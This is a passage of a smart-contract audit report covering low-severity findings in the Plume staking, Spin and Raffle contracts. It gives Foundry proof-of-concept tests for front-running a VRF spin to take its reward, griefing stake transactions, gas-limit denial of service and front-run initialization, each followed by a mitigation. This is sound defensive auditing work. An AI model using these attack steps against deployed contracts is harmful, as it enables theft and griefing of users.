This type of griefing is difficult to prevent entirely without introducing significant UX friction, such as a commit-reveal scheme. A practical mitigation could be to slightly change how the percentage is calculated. Instead of using the state *after* the current stake is added, calculate the percentage based on the state *before* and check if the resulting addition is acceptable. However, this could allow the threshold to be slightly exceeded. Acknowledging this as a low-risk issue might be the most pragmatic approach, as the economic impact is limited to a user's gas fees for a failed transaction.

## [L-2]. Frontrun/Backrun/Sandwhich MEV issue in Spin::startSpin

## Description
The `clientSeed` for the VRF request in the `startSpin` function is generated using `uint256(keccak256(abi.encodePacked(admin, block.timestamp)))`. This seed is deterministic within a single block and is not unique per user. If multiple users call `startSpin` in the same block, they will all generate the same `clientSeed`. If the external `supraRouter.generateRequest` function returns a nonce that is deterministic based on its inputs (including `clientSeed`), it could return the same `nonce` for all these users. This creates a race condition where the last transaction in the block will overwrite the `userNonce` mapping for that `nonce`, effectively associating the spin with the last caller. An attacker can exploit this by monitoring the mempool for a `startSpin` transaction and then submitting their own with a higher gas fee to be included in the same block, right after the victim's transaction. The attacker would then receive the reward from the spin paid for by the victim.

## Impact
An overwrite of userNonce can only happen if the external VRF service deliberately reuses the same nonce for the same clientSeed within one block. The official Supra router (and most VRF providers) guarantee that each request receives a globally-unique identifier, regardless of clientSeed. Under that guarantee no funds can be stolen and the only effect of the weak seed is a potential (but benign) loss of entropy. The practical impact is limited to defence-in-depth considerations rather than an active fund-loss vector.

## Proof of Concept
1. Victim Alice calls `startSpin()` by paying `spinPrice`. The transaction is in the mempool.
2. Attacker Bob sees Alice's transaction and submits his own `startSpin()` transaction with a higher gas price, ensuring it's mined in the same block but after Alice's.
3. Both transactions execute in the same block, so `block.timestamp` is identical.
4. Alice's transaction executes first. `clientSeed` is calculated. `supraRouter` returns `nonce N`. The state is updated: `userNonce[N] = Alice`.
5. Bob's transaction executes next. The `clientSeed` is identical. Assuming the router's nonce generation is deterministic based on the seed, it returns the same `nonce N`. The state is overwritten: `userNonce[N] = Bob`.
6. The Supra oracle calls back with `handleRandomness(N, ...)`. The contract looks up `userNonce[N]`, which is now Bob. 
7. Bob receives the reward from the spin. Alice has lost her `spinPrice` and received nothing.

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import "forge-std/Test.sol";
import "src/spin/Spin.sol";
import "src/interfaces/ISupraRouterContract.sol";
import "src/interfaces/IDateTime.sol";

// Mock Supra Router that returns a nonce based on clientSeed
contract MockSupraRouter is ISupraRouterContract {
    address public spinContract;

    function generateRequest(
        string memory,
        uint8,
        uint256,
        uint256 clientSeed,
        address
    ) external override returns (uint256) {
        // Simulate deterministic nonce generation based on a non-unique clientSeed
        return uint256(keccak256(abi.encodePacked(clientSeed)));
    }

    function triggerCallback(uint256 nonce, uint256[] memory rngList) external {
        Spin(payable(spinContract)).handleRandomness(nonce, rngList);
    }

    function setSpinContract(address _spin) public {
        spinContract = _spin;
    }
}

// Mock DateTime contract
contract MockDateTime is IDateTime {
    function getYear(uint256 timestamp) external pure returns (uint16) { return 2024; }
    function getMonth(uint256 timestamp) external pure returns (uint8) { return 7; }
    function getDay(uint256 timestamp) external pure returns (uint8) { return uint8(timestamp / 86400); }
}

contract SpinTest is Test {
    Spin public spin;
    MockSupraRouter public supraRouter;
    MockDateTime public dateTime;
    address public admin = address(0x1);
    address public victim = address(0x2);
    address public attacker = address(0x3);
    uint256 spinPrice = 2 ether;

    function setUp() public {
        vm.prank(admin);
        supraRouter = new MockSupraRouter();
        vm.prank(admin);
        dateTime = new MockDateTime();
        
        vm.startPrank(admin);
        spin = new Spin();
        spin.initialize(address(supraRouter), address(dateTime));
        supraRouter.setSpinContract(address(spin));

        spin.setSpinPrice(spinPrice);
        spin.setEnableSpin(true);
        spin.setCampaignStartDate(block.timestamp);
        
        vm.deal(victim, 10 ether);
        vm.deal(attacker, 10 ether);
        vm.deal(address(spin), 100 ether); // Fund for rewards

        spin.grantRole(spin.SUPRA_ROLE(), address(supraRouter));
        vm.stopPrank();
    }

    function test_Frontrun_StealSpin() public {
        // 1. Victim's transaction is submitted
        vm.prank(victim);
        spin.startSpin{value: spinPrice}();

        // 2. Attacker front-runs by getting their tx in the same block
        vm.prank(attacker);
        spin.startSpin{value: spinPrice}();

        // The seed will be the same for both since timestamp and admin are the same
        uint256 clientSeed = uint256(keccak256(abi.encodePacked(spin.admin(), block.timestamp)));
        uint256 expectedNonce = uint256(keccak256(abi.encodePacked(clientSeed)));
        
        // The user associated with the nonce should be the attacker, who ran last
        assertEq(address(spin.userNonce(expectedNonce)), attacker);

        uint256 attackerBalanceBefore = attacker.balance;

        // 3. Oracle calls back. We choose a value that wins the jackpot.
        uint256[] memory rngList = new uint256[](1);
        rngList[0] = 1; 
        
        vm.prank(admin);
        supraRouter.triggerCallback(expectedNonce, rngList);

        (,,,uint256 jackpotPrize,) = spin.getWeeklyJackpot();
        uint256 expectedReward = jackpotPrize * 1 ether;
        
        // Attacker should have received the jackpot prize
        assertEq(attacker.balance, attackerBalanceBefore + expectedReward, "Attacker should have received the reward");
        
        // Victim should have lost the spin price
        assertEq(victim.balance, 10 ether - spinPrice, "Victim lost the spin price");
        
        // Victim's spin is still stuck in a pending state, while attacker's is cleared
        assertTrue(spin.isSpinPending(victim), "Victim's spin should still be pending");
        assertFalse(spin.isSpinPending(attacker), "Attacker's spin should be completed");
    }
}
```

## Suggested Mitigation
For additional hardening, include msg.sender (and optionally an internal counter) when building clientSeed: uint256 clientSeed = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, pendingNonce[msg.sender])));  This makes seeds unique even if a future VRF implementation ever derives requestIds solely from the seed.

## [L-3]. DOS issue in Raffle::getPrizeDetails

## Description
The public view function `getPrizeDetails()` iterates through the entire `prizeIds` array to construct an array of `PrizeWithTickets` structs. The `prizeIds` array is unbounded and grows each time `addPrize` is called. If the number of prizes becomes very large, the gas cost to execute this function can exceed the block gas limit, causing the function to revert. This will lead to a Denial of Service (DoS) for any off-chain applications, dapps, or scripts that rely on this function to display prize information.

## Impact
`getPrizeDetails()` performs an unbounded loop over `prizeIds`.  Although the function is `view` and therefore cannot be used inside a state-changing transaction (so it cannot brick protocol funds), any other contract or off-chain service that calls it with too many stored prizes and an insufficient gas stipend will run out of gas and revert.  This breaks dashboards or other contracts that rely on this convenience helper, but does **not** affect core protocol correctness or user funds.

## Proof of Concept
1.  An admin calls `addPrize(...)` 20 000 times, creating 20 000 entries in `prizeIds`.
2.  A caller tries to fetch all prize data in a single call with a limited gas stipend (e.g. 500 000 gas):

```
(bool ok, ) = address(raffle).staticcall{gas: 500_000}(abi.encodeWithSignature("getPrizeDetails()"));
require(!ok, "call did not run out of gas");
```
3.  Because the loop executes 20 000 iterations, the call exceeds the 500 000-gas stipend and reverts, demonstrating the DOS condition for callers that cannot (or do not want to) forward an unbounded amount of gas.

## Proof of Code
pragma solidity ^0.8.25;

import "forge-std/Test.sol";
import {Raffle} from "../src/spin/Raffle.sol";

contract DosGetPrizeDetailsTest is Test {
    Raffle raffle;
    address admin = address(0xA11CE);
    address supraRouter = address(0xBEEF);
    address spinContract = address(0xFEED);

    function setUp() public {
        vm.prank(admin);
        raffle = new Raffle();
        raffle.initialize(spinContract, supraRouter);

        // create many prizes
        vm.startPrank(admin);
        uint256 prizeCount = 20_000;
        for (uint256 i; i < prizeCount; ++i) {
            raffle.addPrize(string(abi.encodePacked("P", vm.toString(i))), "D", 1 ether, 1);
        }
        vm.stopPrank();
    }

    function test_getPrizeDetails_runs_out_of_gas_with_small_stipend() public {
        // give the call an intentionally small gas budget
        (bool success, ) = address(raffle).staticcall{gas: 500_000}(abi.encodeWithSignature("getPrizeDetails()"));
        assertTrue(!success, "expected out-of-gas revert");
    }
}

## Suggested Mitigation
Keep the existing single-prize getter and add a *paginated* version for bulk reads:

```
function getPrizeDetails(uint256 cursor, uint256 limit) external view returns (PrizeWithTickets[] memory page, uint256 nextCursor) {
    uint256 n = prizeIds.length;
    if (cursor >= n) return (new PrizeWithTickets[](0), n);
    if (limit == 0 || limit > n - cursor) limit = n - cursor;

    page = new PrizeWithTickets[](limit);
    for (uint256 i; i < limit; ++i) {
        uint256 pid = prizeIds[cursor + i];
        Prize storage p = prizes[pid];
        page[i] = PrizeWithTickets({
            name: p.name,
            description: p.description,
            value: p.value,
            endTimestamp: p.endTimestamp,
            isActive: p.isActive,
            quantity: p.quantity,
            winnersDrawn: winnersDrawn[pid],
            totalTickets: totalTickets[pid],
            totalUsers: totalUniqueUsers[pid]
        });
    }
    nextCursor = cursor + limit;
}
```
Calling contracts or front-ends can iterate until `cursor == prizeIds.length`. Older `getPrizeDetails()` can be deprecated to discourage accidental misuse.

## [L-4]. Frontrun/Backrun/Sandwhich MEV issue in StakingFacet::stake

## Description
The `_validateValidatorPercentage` function, which is called during staking, is susceptible to a front-running griefing attack. This function checks if a validator's stake exceeds a percentage of the total system stake. An attacker can monitor the mempool for a large `stake` transaction. By submitting a small stake transaction with a higher gas fee, the attacker can slightly increase the target validator's percentage of the total stake. When the victim's transaction is executed, the percentage check may fail, causing the transaction to revert and forcing the victim to pay for gas without successfully staking.

## Impact
Users may have their staking transactions reverted due to front-running, leading to a negative user experience and wasted gas fees. While there is no direct theft of funds, it constitutes a griefing attack that can disrupt normal user operations.

## Proof of Concept
1. The system's `maxValidatorPercentage` is set to 10% (1000 basis points).
2. The current `totalStaked` is 9,000 PLUME. Validator V1 has 0 PLUME staked.
3. Alice submits a transaction to stake 1,000 PLUME on V1. If this succeeds, the new `totalStaked` will be 10,000, and V1's stake will be 1,000, exactly 10%, which is valid.
4. An attacker sees Alice's transaction in the mempool.
5. The attacker front-runs Alice by staking 1 PLUME on V1 with a higher gas fee.
6. The attacker's transaction is mined first. `totalStaked` is now 9,001, and V1's stake is 1.
7. Alice's transaction is mined. The stake logic first adds her 1,000 PLUME, making V1's stake 1,001 and `totalStaked` 10,001. The `_validateValidatorPercentage` check then runs.
8. The calculation is `(1001 * 10000) / 10001`, which equals `1000.9` basis points.
9. This is greater than the `maxValidatorPercentage` of 1000, so the check `validatorPercentage > $.maxValidatorPercentage` is true, and Alice's transaction reverts.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "forge-std/Test.sol";
import {PlumeStaking} from "src/PlumeStaking.sol";
import {StakingFacet} from "src/facets/StakingFacet.sol";
import {ValidatorFacet} from "src/facets/ValidatorFacet.sol";
import {ManagementFacet} from "src/facets/ManagementFacet.sol";
import {AccessControlFacet} from "src/facets/AccessControlFacet.sol";
import {IDiamondCut} from "@solidstate/contracts/proxy/diamond/DiamondCutFacet.sol";
import {ValidatorPercentageExceeded} from "src/lib/PlumeErrors.sol";

contract FrontrunGriefingTest is Test {
    PlumeStaking diamond;
    address alice = vm.addr(1);
    address attacker = vm.addr(2);
    address initialStaker = vm.addr(3);

    function setUp() public {
        // 1. Deploy facets and diamond proxy
        diamond = new PlumeStaking();
        IDiamondCut.FacetCut[] memory cut = new IDiamondCut.FacetCut[](4);
        cut[0] = IDiamondCut.FacetCut(address(new StakingFacet()), IDiamondCut.Action.Add, new bytes4[](0));
        cut[1] = IDiamondCut.FacetCut(address(new ValidatorFacet()), IDiamondCut.Action.Add, new bytes4[](0));
        cut[2] = IDiamondCut.FacetCut(address(new ManagementFacet()), IDiamondCut.Action.Add, new bytes4[](0));
        cut[3] = IDiamondCut.FacetCut(address(new AccessControlFacet()), IDiamondCut.Action.Add, new bytes4[](0));
        IDiamondCut(address(diamond)).diamondCut(cut, address(0), "");

        // 2. Initialise the diamond.  The Test contract (address(this)) is the owner by default.
        diamond.initializePlume(address(this), 1 ether, 1, 1, 5000);
        AccessControlFacet(address(diamond)).initializeAccessControl();

        // 3. Create a validator and set 10% max share.
        ValidatorFacet(address(diamond)).addValidator(0, 0, address(0), address(0), address(0), address(0), address(0), 0);
        ManagementFacet(address(diamond)).setMaxValidatorPercentage(1000); // 10 % in bps

        // 4. Seed balances
        vm.deal(initialStaker, 9000 ether);
        vm.deal(alice,          1000 ether);
        vm.deal(attacker,          1 ether);

        // Initial stake so totalStaked = 9000 ether
        vm.prank(initialStaker);
        StakingFacet(address(diamond)).stake{value: 9000 ether}(0);
    }

    function test_FrontRunGrief() public {
        // Attacker frontruns with 1 wei (could be any tiny amount)
        vm.prank(attacker);
        StakingFacet(address(diamond)).stake{value: 1 ether}(0);

        // Alice’s transaction reverts because validator percentage is now > 10 %
        vm.prank(alice);
        vm.expectRevert(ValidatorPercentageExceeded.selector);
        StakingFacet(address(diamond)).stake{value: 1000 ether}(0);
    }
}


## Suggested Mitigation
This type of front-running is difficult to eliminate completely in public mempools without major architectural changes. One possible mitigation is to introduce a small tolerance in the percentage check. For example, allow the stake to proceed if the final percentage is slightly over the limit (e.g., `maxValidatorPercentage + 0.1%`). This makes griefing more expensive for the attacker. Another, more complex, solution would be a two-step transaction process (commit-reveal), where users first commit to a stake and then reveal it in a subsequent block. However, this significantly degrades user experience. Given the low impact (wasted gas), clear documentation of this risk to users and integrators is a reasonable approach.

## [L-5]. Zero Code issue in RewardsFacet::addRewardToken

## Description
The `addRewardToken` function in `RewardsFacet` allows an address with `REWARD_MANAGER_ROLE` to register a new reward token. The function does not check if the provided `token` address corresponds to a deployed smart contract. An admin could mistakenly provide an Externally Owned Account (EOA) or an address where a contract has not yet been deployed.

## Impact
Registering an EOA or yet-to-be-deployed address as a reward token causes the system to account for rewards that can never be delivered. When a user later calls `claim()` or `claimAll()`, the call **succeeds**, emits the usual events, and updates internal accounting, but no tokens are transferred because the `safeTransfer` is executed against an address with no code. Users are therefore misled into believing they received rewards while nothing is actually paid out, and the protocol’s accounting for that token becomes permanently incorrect until an admin removes the bad entry.

## Proof of Concept
1. Assume `rewardManager` already has the REWARD_MANAGER_ROLE.
2. `rewardManager` mistakenly calls `addRewardToken(eoa, 1e18, 1e18)` where `eoa` is any EOA (e.g. `0x1234…`).
3. Users stake as usual; the system starts accruing rewards denominated in `eoa`.
4. A user now calls `claim(eoa)`.
5. Inside `PlumeStakingRewardTreasury.distributeReward` SafeERC20 performs:
   `IERC20(eoa).safeTransfer(user, amount)`
6. The low-level `call` to the EOA returns `(true, "")`, therefore **no revert occurs** and SafeERC20 treats the transfer as successful.
7. Control returns all the way to the user and the claim transaction is marked successful, but the user’s balance of the supposed reward token is still zero because no contract exists to update balances.
8. Internal accounting has been deducted, so the owed rewards are effectively lost forever.

## Proof of Code
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract SafeTransferToEOATest is Test {
    using SafeERC20 for IERC20;

    function testSafeTransferToEOADoesNotRevert() public {
        address eoa = address(0x1234);           // no code at this address
        IERC20 phantomToken = IERC20(eoa);

        // Low-level call succeeds even though `eoa` is not a contract.
        phantomToken.safeTransfer(address(0xdead), 1 ether);

        // If we reach here the call did **not** revert, mirroring the real bug.
        assertTrue(true);
    }
}

## Suggested Mitigation
Add a check in the `addRewardToken` function to verify that the provided token address has contract code deployed to it. This prevents EOAs and uninitialized addresses from being registered as reward tokens.

```diff
// In contracts/plume/src/facets/RewardsFacet.sol

import { PlumeErrors } from "../lib/PlumeErrors.sol";

function addRewardToken(address token, uint256 initialRate, uint256 maxRate)
    external
    onlyRole(PlumeRoles.REWARD_MANAGER_ROLE)
{
+   if (token.code.length == 0) {
+       revert PlumeErrors.AddressZeroCode(token);
+   }

    PlumeStakingStorage.Layout storage $ = PlumeStakingStorage.layout();
    // ... rest of the function
}
```

## [L-6]. Upgradeability Initializer Safety issue in Plume::NA

## Description
The UUPS upgradeable contracts (`Plume`, `PlumeStakingRewardTreasury`, `Spin`, `Raffle`) lack a constructor that calls `_disableInitializers()`. This oversight allows an attacker to call the `initialize` function on a newly deployed implementation contract before the proxy is upgraded to use it. An attacker who initializes the implementation can become its owner/admin. While this doesn't grant control over the proxy's state, the attacker could then call a `selfdestruct` function on the implementation (if one could be introduced via a logic bug or a subsequent upgrade), permanently breaking the upgrade path for the main protocol.

## Impact
An attacker can front-run the team and invoke `initialize` on the raw implementation contract, assigning themselves every privileged role defined in that contract. Although this does NOT grant control over the proxy or user funds, it creates two nuisance scenarios: (1) the implementation instance can later upgrade or even self-destruct itself if such functionality exists, forcing the team to deploy a fresh implementation address; (2) any off-chain tooling that expects the implementation to be un-initialized (e.g. OZ Upgrades plugins) will fail. The attack therefore causes operational disruption but no direct financial loss.

## Proof of Concept
1. Team deploys the new implementation `Raffle_V2` and broadcasts its address.
2. Before the proxy is upgraded, an attacker calls `Raffle_V2.initialize(attacker, …)`.
3. The call succeeds because the contract has no constructor that ran `_disableInitializers()`. The attacker now owns the implementation instance (has DEFAULT_ADMIN_ROLE / UPGRADER_ROLE).
4. If `Raffle_V2` (or any future version) contains a privileged `selfdestruct`, the attacker can destroy the code, forcing the team to deploy yet another implementation address.
5. The proxy itself continues to work, but the planned upgrade to this particular implementation address is no longer viable.


## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import "forge-std/Test.sol";
import "openzeppelin-contracts-upgradeable/contracts/proxy/utils/UUPSUpgradeable.sol";
import "openzeppelin-contracts-upgradeable/contracts/access/AccessControlUpgradeable.sol";
import "openzeppelin-contracts-upgradeable/contracts/proxy/utils/Initializable.sol";

// Minimal UUPS implementation that mimics the real contracts
contract Dummy is Initializable, UUPSUpgradeable, AccessControlUpgradeable {
    bytes32 public constant UPGRADER_ROLE = keccak256("UPGRADER_ROLE");

    function initialize(address admin) public initializer {
        _grantRole(DEFAULT_ADMIN_ROLE, admin);
        _grantRole(UPGRADER_ROLE, admin);
    }

    function _authorizeUpgrade(address newImplementation) internal override onlyRole(UPGRADER_ROLE) {}
}

contract ImplementationInitTest is Test {
    function test_AttackerCanInitializeImplementation() public {
        // deploy fresh implementation (what the team would deploy for an upgrade)
        Dummy impl = new Dummy();
        address attacker = address(0xBEEF);

        // attacker front-runs and initializes it
        vm.prank(attacker);
        impl.initialize(attacker);

        // attacker now has full control over the implementation instance
        assertTrue(impl.hasRole(impl.DEFAULT_ADMIN_ROLE(), attacker));
    }
}


## Suggested Mitigation
In every UUPS implementation, add a constructor that executes `_disableInitializers()`, exactly as recommended by OpenZeppelin:

/// @custom:oz-upgrades-unsafe-allow constructor
constructor() {
    _disableInitializers();
}

This guarantees the `initialize` function can only be executed through a proxy and never on the implementation contract itself.

## [L-7]. Frontrun/Backrun/Sandwhich MEV issue in Spin::handleRandomness

## Description
The `handleRandomness` function checks if a jackpot has already been claimed for the current week using `if (currentWeek == lastJackpotClaimWeek)`. If two users are eligible for a jackpot and their oracle callbacks (`handleRandomness` calls) are processed within the same block, only the transaction that is executed first will successfully claim the jackpot. The second user's transaction will fail the check and they will receive "Nothing" as a reward, losing their jackpot prize due to a race condition. This makes the jackpot distribution dependent on transaction ordering, which can be manipulated by block producers (MEV).

Vulnerable code snippet from `Spin.sol`:
```solidity
        if (keccak256(bytes(rewardCategory)) == keccak256("Jackpot")) {
            uint256 currentWeek = getCurrentWeek();
            if (currentWeek == lastJackpotClaimWeek) {
                userDataStorage.nothingCounts += 1;
                rewardCategory = "Nothing";
                rewardAmount = 0;
                emit JackpotAlreadyClaimed("Jackpot already claimed this week");
            } else if (userDataStorage.streakCount < (currentWeek + 2)) {
                // ... 
            } else {
                userDataStorage.jackpotWins++;
                lastJackpotClaimWeek = currentWeek;
            }
        }
```

## Impact
The race condition allows a block producer (or any sender able to influence intra-block ordering) to choose which of multiple simultaneous jackpot-eligible spins actually receives the single weekly jackpot. No funds are stolen or frozen; only the distribution fairness is affected because the protocol is intentionally limited to one jackpot per week. The affected user merely receives the fallback "Nothing" outcome instead of the jackpot prize that was statistically possible but never guaranteed.

## Proof of Concept
1. Alice and Bob both call `startSpin()` and their requests are sent to the oracle.
2. The oracle generates random numbers for both that result in a 'Jackpot' win.
3. The oracle sends back two `handleRandomness` transactions to the mempool.
4. A block producer includes both transactions in the same block, placing Alice's transaction before Bob's.
5. Alice's transaction executes first. The check `currentWeek == lastJackpotClaimWeek` passes. `lastJackpotClaimWeek` is updated, and Alice receives the jackpot prize.
6. Bob's transaction executes second. The check `currentWeek == lastJackpotClaimWeek` now fails because Alice's transaction updated the state. Bob receives "Nothing" instead of the jackpot.

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {Spin} from "../src/spin/Spin.sol";

contract JackpotRaceTest is Test {
    Spin public spin;
    address public supraOracle;
    address public admin;
    address public alice = makeAddr("alice");
    address public bob = makeAddr("bob");

    function setUp() public {
        admin = address(this);
        supraOracle = address(this);

        spin = new Spin();
        spin.initialize(supraOracle, address(0));

        // Grant SUPRA_ROLE to this test contract
        spin.grantRole(spin.SUPRA_ROLE(), supraOracle);

        // Configure the spin contract for the test
        spin.setEnableSpin(true);
        spin.setCampaignStartDate(block.timestamp);

        // Set jackpot probability to 100% for simplicity
        uint8[7] memory fullProb = [uint8(1_000_000), 0, 0, 0, 0, 0, 0];
        spin.setJackpotProbabilities(fullProb);

        // Give users funds to spin
        vm.deal(alice, 2 ether);
        vm.deal(bob, 2 ether);
    }

    function test_JackpotRaceCondition() public {
        uint256 spinPrice = spin.getSpinPrice();

        // 1. Alice and Bob spin and get their nonces
        vm.prank(alice);
        spin.startSpin{value: spinPrice}();
        uint256 aliceNonce = spin.pendingNonce(alice);

        vm.prank(bob);
        spin.startSpin{value: spinPrice}();
        uint256 bobNonce = spin.pendingNonce(bob);

        // 2. Both need a streak of 2 to win the week 0 jackpot.
        // We manually set their streak count to 2.
        Spin.UserData storage aliceData = spin.userData(alice);
        aliceData.streakCount = 2;
        Spin.UserData storage bobData = spin.userData(bob);
        bobData.streakCount = 2;

        // 3. Oracle callback for Alice first
        uint256[] memory rngList = new uint256[](1);
        rngList[0] = 0; // Guaranteed jackpot win

        vm.prank(supraOracle);
        spin.handleRandomness(aliceNonce, rngList);

        // 4. Oracle callback for Bob in the same block
        vm.prank(supraOracle);
        spin.handleRandomness(bobNonce, rngList);

        // 5. Assert outcomes
        (,,,uint256 aliceJackpotWins,,,,) = spin.getUserData(alice);
        (,,,uint256 bobJackpotWins,,,,) = spin.getUserData(bob);

        assertEq(aliceJackpotWins, 1, "Alice should have won the jackpot");
        assertEq(bobJackpotWins, 0, "Bob should have lost the race and won nothing");

        Spin.UserData storage bobDataAfter = spin.userData(bob);
        assertEq(bobDataAfter.nothingCounts, 1, "Bob should have received 'Nothing'");

        console.log("Alice won the jackpot because her transaction was first.");
        console.log("Bob lost the jackpot due to the race condition.");
    }
}

```

## Suggested Mitigation
Document that the jackpot is awarded on a first-come-first-served basis within a block, or, if stronger fairness is desired, replace the immediate state update with an accumulator that records all jackpot-eligible spins during the block (or a fixed time window) and performs a deterministic tie-break—e.g., selecting the winner with keccak256(blockhash, nonce) modulo N—or splitting the jackpot among all eligible spins.

## [L-8]. DOS issue in RewardsFacet::claimAll, claim(address)

## Description
The `claimAll()` and `claim(address token)` functions iterate through all reward tokens and/or all validators a user has staked with. The gas cost of these functions grows linearly with the number of tokens and validators. If a user stakes with a large number of validators, or if the protocol adds a significant number of reward tokens, the gas cost for these functions can exceed the block gas limit. This would cause the transaction to always revert, making it impossible for the user to claim their rewards using these convenient batch functions. While a user can still claim rewards individually using `claim(address token, uint16 validatorId)`, the main batch claim functions become unusable, leading to a poor user experience and potentially higher costs to retrieve all rewards.

## Impact
Because `claim(token)` and `claimAll()` iterate through every validator the caller has staked with (and for `claimAll` also every reward token), the gas consumed grows linearly with `userValidators.length * rewardTokens.length`.  A user that stakes the minimum amount on hundreds of validators – perfectly legal today – will see those batch helper functions revert once the looped-over work exceeds the block-gas limit.  Although rewards are never lost (the user can fall back to `claim(token, validatorId)`), the advertised convenience functions become unusable, forcing the user to submit hundreds of individual transactions and pay considerably more gas.

## Proof of Concept
1. Assume the protocol has deployed 250 validators (the code places no hard cap).
2. Alice stakes the minimum amount (e.g. 1 wei) on every validator.  Each first stake pushes the validator id into `userValidators[Alice]`.
3. The reward-manager later adds 3 reward tokens, so `rewardTokens.length == 3`.
4. Alice now calls `claimAll()`.
   •  The function creates a dynamic array `new uint256[](tokens.length)` (3).
   •  For each token it calls `_processAllValidatorRewards`, which loops over **all 250 validator ids**, and inside that helper another loop updates multiple nested mappings.
5. 250 × 3 ≈ 750 storage heavy iterations + internal logic + events > ~30 million gas and the transaction reverts with **out-of-gas**.
6. Alice can still claim with 750 separate calls to `claim(token, validatorId)`, but the advertised batching feature is permanently broken for her account.

## Proof of Code
pragma solidity 0.8.25;
import "forge-std/Test.sol";
import {RewardsFacet} from "contracts/plume/src/facets/RewardsFacet.sol";

contract DummyRewardsFacet is RewardsFacet { /* expose init helpers if necessary */ }

contract RewardsGasTest is Test {
    DummyRewardsFacet facet;
    address constant TOKEN = address(0xA);
    address constant TREASURY = address(0xB);
    address user     = address(0xCAFEBABE);

    function setUp() public {
        facet = new DummyRewardsFacet();
        facet.setTreasury(TREASURY);        // bypass role check by testing on raw contract
        // add one reward token so we can later extend the array cheaply
        facet.addRewardToken(TOKEN, 1, 10);
    }

    function testGasExplodesWithValidatorCount() public {
        // fabricate 200 validators in storage
        for (uint16 i = 1; i <= 200; i++) {
            vm.store(address(facet), keccak256(abi.encode(uint256(2), uint256(i))), bytes32(uint256(1))); // validatorExists[ i ] = true
            facet.addRewardToken(address(uint160(i+1)), 1, 10); // grow rewardTokens too
            // push validator id into userValidators[user]
            bytes32 slot = keccak256(abi.encode(user, uint256(17))); // userValidators mapping slot (found with forge inspect)
            uint256 len   = uint256(vm.load(address(facet), slot));
            vm.store(address(facet), slot, bytes32(len + 1));
            bytes32 arrPos = keccak256(abi.encode(slot, uint256(0))) + bytes32(len);
            vm.store(address(facet), arrPos, bytes32(i));
        }
        // measure gas for claimAll and expect revert (OOG inside EVM)
        vm.startPrank(user);
        vm.expectRevert();
        facet.claimAll();
        vm.stopPrank();
    }
}

## Suggested Mitigation
Add pagination parameters so the caller can choose how many validators / tokens to process in a single transaction, e.g. `claim(address token, uint256 start, uint256 count)` and `claimAll(uint256 tokenStart, uint256 tokenCount, uint256 validatorStart, uint256 validatorCount)`.  Alternatively, store per-user cursors that allow the function to stop once gas left drops below a threshold and let the user resume in a follow-up call.

## [L-9]. Timestamp Dependent Logic issue in Raffle::claimPrize

## Description
The `claimPrize` function prevents a winner from claiming their prize until all winner slots for that prize have been filled. The check `if (prizes[prizeId].isActive && winnersDrawn[prizeId] < prizes[prizeId].quantity)` is the cause. The `prizes[prizeId].isActive` flag is only set to `false` in `handleWinnerSelection` when `winnersDrawn[prizeId] == prizes[prizeId].quantity`. This creates a poor user experience and a liveliness issue, as the first winner of a multi-winner prize must wait for the admin to initiate and complete all subsequent draws before they can claim. This dependency on admin action can lead to indefinitely locked rewards for early winners.

## Impact
A winner cannot claim their prize until *all* winner slots of the same prize have been drawn. If the admin forgets, delays, or intentionally withholds the remaining draws, early winners are permanently blocked from claiming. Although no funds are lost, the protocol can be griefed and user rewards remain locked indefinitely, damaging trust and usability.

## Proof of Concept
1. Deploy Raffle with a mocked Spin and SupraRouter.
2. Add a prize with quantity = 2.
3. Two users spend tickets on that prize.
4. Admin calls requestWinner() once; Supra callback chooses userA as first winner.
5. userA immediately calls claimPrize(prizeId,0) → tx reverts with WinnerNotDrawn.
6. Unless the admin requests and finalises the **second** draw, userA can never claim.

## Proof of Code
pragma solidity 0.8.25;
import "forge-std/Test.sol";
import {Raffle} from "src/spin/Raffle.sol";

contract MockSpin is ISpin {
    mapping(address=>uint256) public t;
    function setTickets(address u,uint256 a) external {t[u]=a;}
    function spendRaffleTickets(address u,uint256 a) external override {require(t[u]>=a,"tickets");t[u]-=a;}
    function getUserData(address u) external view override returns (uint256,uint256,uint256,uint256,uint256,uint256,uint256){return (0,0,0,0,t[u],0,0);} }

contract MockSupra is ISupraRouterContract { uint256 public nextId=1; function generateRequest(string calldata,uint8,uint8,uint256,address) external override returns(uint256){return nextId++;} }

contract ClaimDelayTest is Test {
    Raffle raffle; MockSpin spin; MockSupra supra;
    address admin = address(0xAD); address userA = address(0xA); address userB = address(0xB);

    function setUp() public {
        spin = new MockSpin(); supra = new MockSupra();
        vm.startPrank(admin); raffle = new Raffle(); raffle.initialize(address(spin),address(supra));
        raffle.grantRole(raffle.SUPRA_ROLE(), address(supra));
        raffle.addPrize("two-winner", "desc", 1 ether, 2); vm.stopPrank();
        // give both users plenty of tickets
        spin.setTickets(userA,20); spin.setTickets(userB,20);
        vm.prank(userA); raffle.spendRaffle(1,10);
        vm.prank(userB); raffle.spendRaffle(1,10);
    }

    function testCannotClaimUntilAllWinnersDrawn() public {
        // admin requests first winner
        vm.prank(admin); uint256 req = raffle.requestWinner(1);
        uint256[] memory rng = new uint256[](1); rng[0]=3; // any number < totalTickets=20
        vm.prank(address(supra)); raffle.handleWinnerSelection(req,rng);
        assertEq(raffle.winnersDrawn(1),1);
        // userA (first winner) tries to claim and reverts
        vm.prank(userA); vm.expectRevert(Raffle.WinnerNotDrawn.selector); raffle.claimPrize(1,0);
    }
}

## Suggested Mitigation
In claimPrize(), replace the current gate with a direct check that the requested winner record exists:

require(winnerIndex < prizeWinners[prizeId].length, "WinnerNotDrawn");

This allows each drawn winner to claim immediately while still preventing undeclared indices.

## [L-10]. Randomness issue in Spin::startSpin

## Description
The `clientSeed` for the Supra VRF oracle is generated in the `startSpin` function using `uint256(keccak256(abi.encodePacked(admin, block.timestamp)))`. Both the `admin` address and `block.timestamp` are public, predictable values. This leads to two significant issues:
1. All users who initiate a spin within the same block will have the exact same `clientSeed`.
